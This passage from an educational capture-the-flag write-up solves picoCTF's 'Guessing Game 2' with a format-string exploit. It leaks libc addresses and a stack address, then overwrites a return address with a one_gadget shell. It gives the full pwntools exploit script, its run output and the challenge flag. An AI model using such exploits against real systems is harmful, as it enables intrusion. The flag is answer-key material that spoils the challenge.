We'll receive a response that the value is `0xf7dd6fe0`. Using the same method, we can dump the address of `atol` as well (it's `0xf7dd4770`). This allows us to determine which of the two libraries we saw earlier the server is actually using by searching for the `LibC` that has the combination of these offsets:
```console
root@kali:~/utils/libc-database# ./find rand fe0 atol 770 | awk '{printf $2}' && echo
(libc6-i386_2.27-3ubuntu1.2_amd64)
```
Let's check this library's info for full details regarding the offsets:
```console
root@kali:~/utils/libc-database# ./dump libc6-i386_2.27-3ubuntu1.2_amd64
offset___libc_start_main_ret = 0x18e91
offset_system = 0x0003cd80
offset_dup2 = 0x000e61b0
offset_read = 0x000e56c0
offset_write = 0x000e5790
offset_str_bin_sh = 0x17bb8f
root@kali:~/utils/libc-database# ./dump libc6-i386_2.27-3ubuntu1.2_amd64 atol
offset_atol = 0x0002e770
root@kali:~/utils/libc-database# ./dump libc6-i386_2.27-3ubuntu1.2_amd64 rand
offset_rand = 0x00030fe0
```
Back to the format string vulnerability, it also allows us to write to (almost) any address using `%n`. It might be tempting to try and overwrite a `.got.plt` entry with the address of `system`, but unfortunately the binary has `Full RELRO` protection:
```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# checksec --file=./vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   80) Symbols       No    0               3               ./vuln
```
So, the next best thing is to skip over the stack canary and overwrite the `win` return address. For that, we need to first leak a stack address, then use it to calculate where the return address is located, and finally replace it.
We'll leak `win`'s `ebp`. Let's find it with the debugger.
First, we need a view of the stack at the point of the format string leak:
```assembly
|           0x080487c7      8d85f4fdffff   lea eax, [format]
|           0x080487cd      50             push eax                    ; const char *format
|           0x080487ce      e89dfcffff     call sym.imp.printf         ; int printf(const char *format)
|           0x080487d3      83c410         add esp, 0x10
```
So, we set a breakpoint at `0x080487ce`:
```
gdb-peda$ b *0x080487ce
Breakpoint 1 at 0x80487ce
```
We can enter `"%p.%p.%p"` as the name (causing the program to print `"0x200.0xf7fb05c0.0x804877d"`), and in parallel view the stack in the debugger:
```
[------------------------------------stack-------------------------------------]
0000| 0xffffd110 --> 0xffffd12c ("%p.%p.%p")
0004| 0xffffd114 --> 0x200
0008| 0xffffd118 --> 0xf7fb05c0 --> 0xfbad2288
0012| 0xffffd11c --> 0x804877d (:       add    ebx,0x183f)
0016| 0xffffd120 --> 0x1
0020| 0xffffd124 --> 0xfffff861
0024| 0xffffd128 --> 0xfffff861
0028| 0xffffd12c ("%p.%p.%p")
```
As we can see, the values printed by the program are also visible via the stack view. We're looking for `ebp` which is located right before `ret`. The `ret` value we're expecting is `0x0804888c`:
```assembly
|       :   0x08048887      e8e2feffff     call sym.win
\       `= 0x804888c (: jmp    0x8048879 )
```
So the return address is the 139th DWORD from our location:
```python
>>> (0xffffd33c - 0xffffd110) / 4
139.0
```
This makes `ebp` the 138th DWORD from our location:
```
gdb-peda$ p/x *(int*)($esp + 139 * 4)
$16 = 0x804888c
gdb-peda$ p/x *(int*)($esp + 138 * 4)
$17 = 0xffffd358
```
We got an address on the stack: `0xffffd358`. We can calculate the diff between this address and the stack address of the return address:
```python
>>> 0xffffd358 - 0xffffd33c
28
```
So we finally know that if we leak the 138th value from the stack and subtract 28 from it, we get the address of `ret`. That's the address we want to overwrite.
The last question is what to overwrite `ret` with. We'll just use [`one_gadget`](https://github.com/david942j/one_gadget): 
```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# one_gadget libc6-i386_2.27-3ubuntu1.2_amd64.so
0x3cc5a execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL
0x3cc5c execve("/bin/sh", esp+0x38, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x38] == NULL
0x3cc60 execve("/bin/sh", esp+0x3c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x3c] == NULL
0x3cc67 execve("/bin/sh", esp+0x40, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x40] == NULL
0x6730f execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL
0x67310 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL
0x13593e execl("/bin/sh", eax)
constraints:
  ebx is the GOT address of libc
  eax == NULL
0x13593f execl("/bin/sh", [esp])
constraints:
  ebx is the GOT address of libc
  [esp] == NULL
```
These gadgets seem to have a cryptic constraint: "esi is the GOT address of libc". There's some information about it [here](https://github.com/david942j/one_gadget/issues/130). In short, they explain that this means that `esi` needs to be the value of `libc_base` + `readelf -d /path/to/libc | grep PLTGOT`, but usually `esi` already has this value in `main`. Luckily, in our case, `main` is calling `win`.
Once we overwrite `ret` with `one gadget`, we'll get a shell. Putting it all together as a `pwntools` script, we get:
```python
# Create template using:
# $ pwn template --host jupiter.challenges.picoctf.org --port 28953 ./vuln
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
from functools import partial
import ctypes
if args.LOCAL:
    libc = ELF(exe.libc.path)
    one_gadget_base_addr = 0x13964a
else:
    libc = ELF('libc6-i386_2.27-3ubuntu1.2_amd64.so')
    one_gadget_base_addr = 0x6730f
class GuessingGame2():
    def __init__(self, io, libc):
        self.io = io
        self.libc = libc
        self.guess_val = str(ctypes.c_int32((libc.symbols["rand"] % -4096) + 1).value)
        with context.local(log_level='ERROR'): 
            self.fmt_offset = FmtStr(self.send_payload).offset
        log.info("Guess value: {}".format(self.guess_val))    
        log.info("Format string offset: {}".format(self.fmt_offset))
    def guess(self, guess_val):
        self.io.recvuntil("What number would you like to guess?\n")
        log.debug("Guessing: '{}'".format(guess_val))
        self.io.sendline(guess_val)
        line = self.io.recvline()
        if not "Congrats!" in line.decode("ascii"):
            raise RuntimeError("Incorrect guess: {}".format(guess_val))
    def enter_name(self, name):
        log.debug("Entering name: '{}'".format(name))
        self.io.sendline(name)
        self.io.recvuntil("Congrats: ")
        output = self.io.recvline(keepends = False)
        return output
    def send_payload(self, payload):
        self.guess(self.guess_val)
        log.info("Sending payload: \n{}".format(hexdump(payload)))
        return self.enter_name(payload)
    def leak_addr(self, addr):
        output = self.send_payload(p32(addr) + "%{}$s".format(self.fmt_offset).encode("ascii"))
        addr_copy = u32(output[0:4])
        assert (addr == addr_copy)
        value = u32(output[4:8])
        log.info("Leaked: memory @ {}  == {}".format(hex(addr), hex(value)))
        return value
    def leak_stack(self, offset):
        output = self.send_payload("%{}$p".format(offset).encode("ascii"))
        value = int(output.decode('ascii'), 16)
        log.info("Leaked: stack @ DWORD offset {} == {}".format(offset, hex(value)))
        return value
    def get_fmt_str_writer(self):
        return FmtStr(self.send_payload, offset = self.fmt_offset)
io = start()
gg2 = GuessingGame2(io, libc)
atol_addr = gg2.leak_addr(exe.got["atol"])
log.info("Address of atol() from GOT  : 0x{:08x}".format(atol_addr))
log.info("Address of atol() from LibC : 0x{:08x}".format(libc.symbols["atol"]))
rand_addr = gg2.leak_addr(exe.got["rand"])
log.info("Address of rand() from GOT  : 0x{:08x}".format(rand_addr))
log.info("Address of rand() from LibC : 0x{:08x}".format(libc.symbols["rand"]))
libc.address = rand_addr - libc.symbols["rand"]
assert(libc.address & 0xFFF == 0)
log.info("LibC Base                   : 0x{:08x}".format(libc.address))
log.info("Leaking value of win() EBP")
win_frame_ebp = gg2.leak_stack(138)
win_ret_addr = win_frame_ebp - 28
log.info("win() return address on stack: {}".format(hex(win_ret_addr)))
# First method: Using "One Gadget"
one_gadget_abs_addr = one_gadget_base_addr + libc.address
log.info("Writing {} to {}".format(hex(win_ret_addr), hex(one_gadget_abs_addr)))
autofmt = gg2.get_fmt_str_writer()
autofmt.write(win_ret_addr, one_gadget_abs_addr)
autofmt.execute_writes()
"""
# Alternative method: Using ROP
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh'))
log.info('Address of system(): {}'.format(hex(system_addr)))
log.info('Address of /bin/sh: {}'.format(hex(bin_sh_addr)))
rop = ROP(libc)
rop.system(bin_sh_addr)
log.info("ROP: \n{}".format(rop.dump()))
autofmt = gg2.get_fmt_str_writer()
for i, dword in enumerate(unpack_many(rop.chain(), exe.bits, endian='little', sign=False)):
    autofmt.write(win_ret_addr + ( (exe.bits // 8) * i), dword)
autofmt.execute_writes()
"""
io.interactive()
```
Output:
```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# python3 exploit.py
[*] '/media/sf_CTFs/pico/Guessing_Game_2/vuln'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] '/media/sf_CTFs/pico/Guessing_Game_2/libc6-i386_2.27-3ubuntu1.2_amd64.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to jupiter.challenges.picoctf.org on port 28953: Done
[*] Guess value: -31
[*] Format string offset: 7
[*] Sending payload:
    00000000  e4 9f 04 08  25 37 24 73                            │····│%7$s│
    00000008
[*] Leaked: memory @ 0x8049fe4  == 0xf7e06770
[*] Address of atol() from GOT  : 0xf7e06770
[*] Address of atol() from LibC : 0x0002e770
[*] Sending payload:
    00000000  f8 9f 04 08  25 37 24 73                            │····│%7$s│
    00000008
[*] Leaked: memory @ 0x8049ff8  == 0xf7e08fe0
[*] Address of rand() from GOT  : 0xf7e08fe0
[*] Address of rand() from LibC : 0x00030fe0
[*] LibC Base                   : 0xf7dd8000
[*] Leaking value of win() EBP
[*] Sending payload:
    00000000  25 31 33 38  24 70                                  │%138│$p│
    00000006
[*] Leaked: stack @ DWORD offset 138 == 0xffb19508
[*] win() return address on stack: 0xffb194ec
[*] Writing 0xffb194ec to 0xf7e3f30f
[*] Sending payload:
    00000000  25 31 35 63  25 31 38 24  68 68 6e 25  32 31 32 63  │%15c│%18$│hhn%│212c│
    00000010  25 31 39 24  68 68 6e 25  31 36 63 25  32 30 24 68  │%19$│hhn%│16c%│20$h│
    00000020  68 6e 25 34  63 25 32 31  24 68 68 6e  ec 94 b1 ff  │hn%4│c%21│$hhn│····│
    00000030  ee 94 b1 ff  ed 94 b1 ff  ef 94 b1 ff               │····│····│····│
    0000003c
[*] Switching to interactive mode
$ ls
flag.txt
vuln
vuln.c
xinet_startup.sh
$ cat flag.txt
picoCTF{p0p_r0p_4nd_dr0p_1t_3c29990aa7386650}
$ exit
$
[*] Got EOF while reading in interactive
$
[*] Closed connection to jupiter.challenges.picoctf.org port 28953
[*] Got EOF while sending in interactive
```
The flag: `picoCTF{p0p_r0p_4nd_dr0p_1t_3c29990aa7386650}`